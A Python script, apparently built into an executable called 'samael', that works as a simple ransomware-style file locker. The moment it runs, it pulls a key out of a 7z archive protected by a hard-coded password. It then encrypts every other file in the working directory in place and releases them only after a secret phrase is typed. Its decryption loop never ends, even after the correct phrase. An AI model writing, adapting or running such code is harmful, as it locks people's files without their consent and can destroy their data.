import os
from cryptography.fernet import Fernet, InvalidToken
import tkinter as tk
from tkinter import simpledialog, scrolledtext
import py7zr

# Hardcoded password for 7z file
HARD_CODED_PASSWORD = "your password here"

def decrypt_key_file(encrypted_key_file_path):
    # Decrypt the 7z file using the hardcoded password
    with py7zr.SevenZipFile(encrypted_key_file_path, mode='r', password=HARD_CODED_PASSWORD) as archive:
        archive.extractall()

def load_key():
    try:
        with open("thekey.key", "rb") as key_file:
            return key_file.read()
    except FileNotFoundError:
        return None

def encrypt_files(files, key, output_area):
    fernet = Fernet(key)
    for file in files:
        with open(file, "rb") as thefile:
            content = thefile.read()
        content_encrypted = fernet.encrypt(content)
        with open(file, "wb") as thefile:
            thefile.write(content_encrypted)
        output_area.insert(tk.END, f"Encrypted {file} successfully!\n")

def decrypt_files(files, key, output_area):
    fernet = Fernet(key)
    secret_phrase = "your secret phrase here"
    
    while True:
        user_phrase = simpledialog.askstring("Input", "Enter the secret phrase to decrypt files:")
        if user_phrase == secret_phrase:
            for file in files:
                try:
                    with open(file, "rb") as thefile:
                        content = thefile.read()
                    content_decrypted = fernet.decrypt(content)
                    with open(file, "wb") as thefile:
                        thefile.write(content_decrypted)
                    output_area.insert(tk.END, f"Decrypted {file} successfully!\n")
                    
                except InvalidToken:
                    output_area.insert(tk.END, f"Failed to decrypt {file}: Invalid key or the file is not encrypted.\n")
                except Exception as e:
                    output_area.insert(tk.END, f"An error occurred while processing {file}: {e}\n")
        else:
            output_area.insert(tk.END, "Invalid secret phrase! Please try again.\n")

def process_files(output_area):
    # List of files to process
    files = [file for file in os.listdir() if file not in ["thekey.key", "samael.py","protected_key.7z","samael.exe","samael.spec"] and os.path.isfile(file)]
    output_area.insert(tk.END, "Files to process: " + ", ".join(files) + "\n")

    # Decrypt the key file using the hardcoded password
    decrypt_key_file("protected_key.7z")

    # Load the key after decryption
    key = load_key()
    if key:
        encrypt_files(files, key, output_area)

        # Proceed to decrypt files after encryption
        decrypt_files(files, key, output_area)

# Set up the main window
root = tk.Tk()
root.title("File Encryptor")

# Set up the output area
output_area = scrolledtext.ScrolledText(root, width=60, height=20)
output_area.pack(padx=10, pady=10)

# Automatically process files when the program runs
process_files(output_area)

# Start the GUI event loop
root.mainloop()
